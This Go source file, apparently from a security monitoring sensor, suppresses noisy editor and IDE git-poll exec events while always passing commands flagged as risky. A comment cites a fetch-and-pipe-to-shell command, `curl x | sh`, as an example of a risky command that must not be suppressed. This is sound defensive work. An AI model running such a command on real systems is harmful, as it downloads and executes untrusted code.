package main

import "strings"

// isEditorNoise reports whether an exec is routine editor/IDE housekeeping that
// floods the feed (VSCode git polling, language servers). It matches when the
// acting OR parent process name is in parents.
//
// Safety: looksRisky-positive commands are NEVER suppressed, so a compromised
// editor extension (e.g. `bash -c "curl x | sh"` spawned by code) still reaches
// the model. We only drop commands that would otherwise resolve benign anyway.
// Provenance keys on the EXEC's immediate parent: an interactive `git status`
// typed in a terminal has parent_comm "bash"/"zsh", not "node"/"code", so it is
// not suppressed. An empty parents map disables suppression entirely.
func isEditorNoise(e ExecEvent, parents map[string]bool) bool {
	if len(parents) == 0 {
		return false
	}
	if looksRisky(e) {
		return false
	}
	return parents[e.Comm] || parents[e.ParentComm]
}

// isIdeGitPoll reports whether an exec is a machine-generated IDE git poll,
// matched by command-line SIGNATURE rather than process provenance. This is the
// provenance-free fallback: it quiets the feed even before the sensor is rebuilt
// to populate comm/parent_comm (e.g. VSCode's
// `git -c diff.autoRefreshIndex=false diff --shortstat HEAD` and
// `bash -c "GIT_OPTIONAL_LOCKS=0 git …"`). The default signatures are config/env
// tokens a human never types interactively, so this can't suppress hand-typed
// commands. Risky commands are never suppressed (looksRisky gate). sigs are
// lowercase substrings; an empty list disables this path.
func isIdeGitPoll(e ExecEvent, sigs []string) bool {
	if len(sigs) == 0 {
		return false
	}
	if looksRisky(e) {
		return false
	}
	cmd := strings.ToLower(e.CommandLine())
	for _, sig := range sigs {
		if strings.Contains(cmd, sig) {
			return true
		}
	}
	return false
}

// parseNameSet splits a comma-separated flag into a set of process names.
func parseNameSet(s string) map[string]bool {
	set := map[string]bool{}
	for _, p := range strings.Split(s, ",") {
		if p = strings.TrimSpace(p); p != "" {
			set[p] = true
		}
	}
	return set
}

// splitCSVLower splits a comma-separated flag into a slice of lowercase,
// non-empty, trimmed substrings.
func splitCSVLower(s string) []string {
	var out []string
	for _, p := range strings.Split(s, ",") {
		if p = strings.TrimSpace(strings.ToLower(p)); p != "" {
			out = append(out, p)
		}
	}
	return out
}
